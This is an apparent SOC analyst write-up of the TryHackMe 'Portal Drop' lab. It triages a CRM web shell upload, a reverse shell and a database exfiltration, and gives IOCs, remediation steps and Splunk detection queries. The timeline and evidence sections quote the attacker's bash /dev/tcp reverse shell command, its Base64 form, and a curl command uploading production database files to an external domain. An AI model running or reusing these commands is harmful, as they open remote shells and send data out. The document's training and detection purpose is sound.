# Case 05: CRM Portal Breach – Web Shell Upload to Reverse Shell & Database Exfiltration

- **Environment:** TryHackMe – Portal Drop (Medium)
- **Triage Scope:** Multi-Source Telemetry (Splunk Enterprise Web Access Logs, TryDetectMe XDR - the EDR product simulated inside the TryHackMe room, Decodora Offline Decoder, VirusTotal CTI)
- **Severity:** `Critical` | **Triage Verdict:** `True Positive` (Confirmed Server Compromise & Data Exfiltration)
- **Escalation Decision:** `Escalated to Tier 2 / Incident Response`
- **Investigation Outcome:** Room Completed 100% (400/400 pts | Captured Flag: `THM{p0rtal_dropp3d?}`)
- **MITRE ATT&CK:** `T1190` (Exploit Public-Facing Application), `T1505.003` (Web Shell), `T1059.004` (Unix Shell), `T1071.001` (Web Protocols), `T1082` (System Information Discovery), `T1016` (System Network Configuration Discovery), `T1083` (File & Directory Discovery), `T1552.001` (Credentials in Files), `T1005` (Data from Local System), `T1048.003` (Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol)

---

## 1. Executive Summary

A critical compromise of production CRM server `TPMHQ-CRM01` running on Ubuntu 22.04 LTS was detected following widespread credential stuffing attempts against `/CRM/login.php`, culminating in an unauthenticated arbitrary file upload via `/CRM/portal/upload.php` from threat actor IP `34.67.91[.]83` (`python-requests/2.31.0`) that dropped a PHP web shell at `/var/www/html/CRM/portal/uploads/invoice.php`. The adversary interacted with the web shell using a hardcoded authorization token (`auth=31337`) and Base64-encoded execution parameters, spawning an interactive reverse shell from `/usr/sbin/php-fpm7.4` to an external listener at `115.58.148[.]86:8080` (China Unicom Backbone). Operating under the `www-data` security context, the adversary performed internal host and network enumeration, harvested database credentials from `/etc/trycrm/config.json`, and staged production database assets before exfiltrating `/var/lib/trycrm/prod.db` and `/var/lib/trycrm/prod.idx` via `curl` to `https://portaldrop2025[.]xyz/x7Ja0mlqP`, prompting immediate host isolation, perimeter IP/domain blacklisting, web shell quarantine, and credential revocation.

---

## 2. Alert Scope

| Parameter | Technical Detail |
| :--- | :--- |
| **Primary Compromised Host** | `TPMHQ-CRM01` (Ubuntu 22.04 LTS, Apache2 + PHP-FPM 7.4) |
| **Secondary Monitored Host** | `TMPEU-UATSERVER` (Alert: Hands-on-keyboard root activity – Verified isolated/benign) |
| **Compromised Service Identity** | `www-data` (Apache web service account) |
| **Attacker Ingress IP** | `34.67.91[.]83` (User-Agent: `python-requests/2.31.0`) |
| **Brute Force Source Addresses** | Distributed IPs: `18.205.93[.]1`, `52.95.245[.]33`, `54.201.10[.]55`, `185.199.108[.]133` |
| **Reverse Shell / C2 Endpoint** | `115.58.148[.]86` (Port: `8080`, AS4837 China Unicom) |
| **Exfiltration Domain & Endpoint** | `https://portaldrop2025[.]xyz/x7Ja0mlqP` (Resolves to `115.58.148[.]86:443`) |
| **Uploaded Web Shell Artifact** | `/var/www/html/CRM/portal/uploads/invoice.php` (Passcode: `auth=31337`) |
| **Compromised Configuration File** | `/etc/trycrm/config.json` |
| **Exfiltrated Data Assets** | `/var/lib/trycrm/prod.db`, `/var/lib/trycrm/prod.idx` |

---

## 3. Investigation Timeline (Normalized to UTC)

> **Timezone Normalization Note:** In this lab, Splunk indexed web access logs in **UTC** (`14:17`–`14:28`), whereas the browser-based TryDetectMe XDR console rendered alert timestamps in the analyst's local timezone (**UTC+6**, `20:27`–`21:40`). All timestamps below are normalized to **UTC** (with the raw UTC+6 UI timestamp shown in parentheses so they can be cross-checked against the screenshots).

| Timestamp (UTC) | Log Source / Event | Technical Observation & Correlation |
| :--- | :--- | :--- |
| `2025-11-06 14:17 – 14:20 UTC` | Splunk / `access_combined` | Multiple external IPs initiated automated POST credential stuffing against `/CRM/login.php`, generating high-frequency `401 Unauthorized` responses (66.03%). |
| `2025-11-06 14:27:00 UTC` *(20:27:00 UTC+6)* | TryDetectMe XDR / EDR Alert | High-severity alert triggered (minute-rounded in XDR UI): **Suspicious File Write: Backdoor:PHP/Generic** on `TPMHQ-CRM01`. |
| `2025-11-06 14:27:32 UTC` | Splunk / `access_combined` | Attacker IP `34.67.91[.]83` (`python-requests/2.31.0`) sent an unauthenticated `POST /CRM/portal/upload.php`, writing `/var/www/html/CRM/portal/uploads/invoice.php` (`HTTP 200`, 826 bytes). |
| `2025-11-06 14:27:34 UTC` | Splunk / `access_combined` | Attacker invoked `POST /CRM/portal/uploads/invoice.php?q=ZDJodl1XMXA&auth=31337`. Decoded via **Decodora** as `whoami` to verify execution context. |
| `2025-11-06 14:28:34 UTC` | Splunk / `access_combined` | Attacker invoked `POST /CRM/portal/uploads/invoice.php?q=WW1GemFDQxRh...&auth=31337`. Decoded via **Decodora** as `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`. |
| `2025-11-06 14:29:00 UTC` *(20:29:00 UTC+6)* | TryDetectMe XDR / EDR Alert | High-severity alert triggered: **Parent-Child Anomaly: Shell Spawn** on `TPMHQ-CRM01`. Parent `/usr/sbin/php-fpm7.4` spawned `/bin/bash` connecting outbound to `115.58.148[.]86:8080`. |
| `2025-11-06 14:34:00 UTC` *(20:34:00 UTC+6)* | TryDetectMe XDR / EDR Alert | Medium-severity alert triggered: **Unusual User Behavior: System Discovery** under `www-data` (`uname -a`, `ip a`, `find /etc -type f \( -name '*.yml' -o -name '*.json' -o -name '*.toml' \)`). |
| `2025-11-06 14:34:10 UTC` *(20:34:10 UTC+6)* | TryDetectMe XDR / Process Info | Sensitive credential access: `cat` (PID `1216`) read `/etc/trycrm/config.json`, exposing database paths and credentials. |
| `2025-11-06 14:37:00 UTC` *(20:37:00 UTC+6)* | TryDetectMe XDR / Process Info | Data Exfiltration: `curl` (PID `1224`) executed `curl -sS -T /var/lib/trycrm/prod.db -T /var/lib/trycrm/prod.idx https://portaldrop2025.xyz/x7Ja0mlqP` (`115.58.148[.]86:443`). |
| `2025-11-06 15:40:00 UTC` *(21:40:00 UTC+6)* | TryDetectMe XDR / EDR Alert | Low-severity alert: **Hands-On-Keyboard Root Activity** on `TMPEU-UATSERVER`. Triaged and verified as isolated benign maintenance (no lateral movement). |
| `Response Phase (in XDR Simulator)` | TryDetectMe XDR / Response | Executed required simulator response actions: host isolation, process termination (`PID 1203`), IP/domain blocking (`115.58.148[.]86`, `portaldrop2025[.]xyz`), and web shell quarantine (`THM{p0rtal_dropp3d?}`). |

---

### Forensic Evidence Artifacts

#### Evidence 1: Scenario Victory & 100% Room Completion
TryHackMe Portal Drop investigation completion dashboard confirming all investigative questions answered, 100% scenario completion, and full 400-point capture:
![TryHackMe Portal Drop Completion](screenshots/01-tryhackme-portal-drop-completion.png)

#### Evidence 2: Web Shell Drop & Execution Telemetry in Splunk
Splunk search capturing attacker IP `34.67.91[.]83` leveraging `python-requests/2.31.0` to upload `invoice.php` via `upload.php` and invoke execution commands:
![Splunk Web Shell Upload](screenshots/02-splunk-access-logs-webshell-upload.png)

#### Evidence 3: Reverse Shell Stager De-Obfuscation via Decodora (Custom Analyst Tool)
Decoding the Base64 payload `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuNTguMTQ4Ljg2LzgwODAgMD4mMQ==` offline using **[Decodora](https://mahialjaber.github.io/Decodora/)**, exposing the active interactive reverse shell payload targeting `115.58.148[.]86:8080`:
![Decodora Decoded Reverse Shell](screenshots/03-decodora-decoded-reverse-shell.png)

#### Evidence 4: EDR Parent-Child Anomaly – Interactive Shell Spawn
TryDetectMe XDR alert capturing the illegal execution lineage where `/usr/sbin/php-fpm7.4` spawned `/bin/bash` with argument `-c "bash -i >& /dev/tcp/115.58.148.86/8080 0>&1"`:
![EDR Shell Spawn Reverse Shell](screenshots/04-edr-shell-spawn-reverse-shell.png)

#### Evidence 5: VirusTotal Threat Intelligence on Reverse Shell Listener
CTI enrichment for `115.58.148[.]86` confirming multiple security vendors flagging the host as malicious malware infrastructure originating from China Unicom Backbone:
![VirusTotal C2 Reputation](screenshots/05-virustotal-c2-reputation.png)

#### Evidence 6: Production Database Exfiltration via curl
Process and network telemetry capturing the unauthorized outbound upload of `/var/lib/trycrm/prod.db` and `/var/lib/trycrm/prod.idx` to staging domain `portaldrop2025[.]xyz`:
![EDR Data Exfiltration via curl](screenshots/06-edr-data-exfiltration-curl.png)

#### Evidence 7: Web Shell Quarantine & Challenge Flag Capture
Remediation confirmation showing file collection and quarantine of `/var/www/html/CRM/portal/uploads/invoice.php`, rewarding challenge flag `THM{p0rtal_dropp3d?}`:
![EDR Flag Capture Remediation](screenshots/07-edr-flag-capture-remediation.png)

---

## 4. What Could Make This Benign? (Disproving the Hypothesis)

To ensure defensible Tier-1 alert triage, potential benign explanations were evaluated against collected forensic evidence:

| Alternative Hypothesis | Verification Test | Forensic Finding & Disproval |
| :--- | :--- | :--- |
| **Legitimate User Invoice Upload** | Examine uploaded file MIME type, file headers, and extension. | ❌ The uploaded file was named `invoice.php` (executable PHP code, not a PDF/image) uploaded via an unauthenticated endpoint and executed immediately with a hardcoded auth parameter `auth=31337`. |
| **Authorized DevOps Administration** | Check whether interactive bash commands are standard PHP-FPM service operations. | ❌ Production PHP-FPM processes (`php-fpm7.4`) under standard configurations never legitimately spawn interactive `/bin/bash` sessions connecting to foreign public IP addresses (`115.58.148[.]86:8080`). |
| **Scheduled Database Backup Script** | Correlate `curl` upload with cron jobs and approved internal backup storage targets. | ❌ No cron job scheduled `curl -T` to `portaldrop2025[.]xyz`. The upload was run manually from an interactive reverse shell, targeting an external domain registered days prior and resolving to an unmanaged overseas IP. |
| **UAT Server Maintenance (Alert 4)** | Review activity on `TMPEU-UATSERVER` for signs of compromise. | ✔️ Root commands on `TMPEU-UATSERVER` were restricted to local system discovery during maintenance and showed no network egress or relation to `34.67.91[.]83` or `115.58.148[.]86`. Correctly verified as non-breached. |

**Triage Verdict:** All benign hypotheses for `TPMHQ-CRM01` are conclusively disproven. The event represents a confirmed **True Positive** critical intrusion.

---

## 5. Extracted Indicators of Compromise (Defanged)

### Network Indicators
- **Attacker Ingress IP (Web Shell Upload):** `34.67.91[.]83`
- **Reverse Shell C2 IP:** `115.58.148[.]86` (Port: `8080`)
- **Exfiltration Domain:** `portaldrop2025[.]xyz`
- **Exfiltration URL:** `hxxps://portaldrop2025[.]xyz/x7Ja0mlqP`
- **Exfiltration Egress Endpoint:** `115.58.148[.]86:443`
- **Distributed Brute Force IPs:** `18.205.93[.]1`, `52.95.245[.]33`, `54.201.10[.]55`, `185.199.108[.]133`

### Host & Artifact Indicators
- **Affected Server:** `TPMHQ-CRM01` (Ubuntu 22.04 LTS)
- **Compromised Account:** `www-data` (UID: `33`)
- **Malicious Web Shell:** `/var/www/html/CRM/portal/uploads/invoice.php`
- **Web Shell Auth Token:** `31337`
- **Accessed Config File:** `/etc/trycrm/config.json`
- **Targeted Assets:** `/var/lib/trycrm/prod.db`, `/var/lib/trycrm/prod.idx`
- **Abused System Binaries:** `/usr/sbin/php-fpm7.4`, `/bin/bash`, `/bin/cat`, `/bin/curl`

---

## 6. Containment & Remediation Actions

### 1. Actions Executed in the TryDetectMe XDR Simulator
- **Host Isolation:** Isolated `TPMHQ-CRM01` in the TryDetectMe XDR console.
- **Process Termination:** Terminated the active reverse-shell child process (`PID 1203`).
- **Artifact Quarantine:** Quarantined `/var/www/html/CRM/portal/uploads/invoice.php` (completing the room remediation step and releasing flag `THM{p0rtal_dropp3d?}`).
- **Simulator IOC Blocks:** Added `115.58.148[.]86` and `portaldrop2025[.]xyz` to the simulator blocklist.

### 2. Recommended Production Hardening & Credential Remediation
- **Web Server Upload Hardening:** Disable script execution in `/var/www/html/CRM/portal/uploads/` (`php_admin_flag engine off` / Nginx location deny for `*.php`), validate file extensions server-side against an allowlist, and store uploads outside the web root.
- **Perimeter Egress & Ingress Filtering:** Block attacker ingress IP `34.67.91[.]83` and C2 IP `115.58.148[.]86` at perimeter firewalls, and sinkhole `portaldrop2025[.]xyz` at internal DNS resolvers.
- **Database & Application Credential Rotation:** Rotate the database credentials exposed in `/etc/trycrm/config.json` and force password/session resets for all customer/user records inside the exfiltrated `prod.db` database.

### 4. SIEM Detection Engineering Queries

#### Query 1 (Splunk): Detect Web Shell Access in Uploads Directories
```spl
index="portal_drop" sourcetype="access_combined" uri_path="*/uploads/*.php*"
| stats count earliest(_time) as first_seen latest(_time) as last_seen values(clientip) as attacker_ips values(useragent) as agents by uri_path, status
| where count > 0
```

#### Query 2 (Sysmon / Auditd): Detect PHP-FPM Spawning Interactive Shells
```spl
index="linux_audit" (process_name="bash" OR process_name="sh") parent_process_name="php-fpm*"
| table _time, host, user, parent_process_name, process_name, process_exec, cmdline
```

#### Query 3 (Suricata / Zeek): Detect curl Uploads to External Storage Services
```spl
index="suricata" event_type="http" http.http_method="PUT" OR http.http_method="POST"
| regex http.url="^https?://(?!.*\.company\.thm).*"
| table _time, src_ip, dest_ip, http.hostname, http.url, http.user_agent, http.status
```
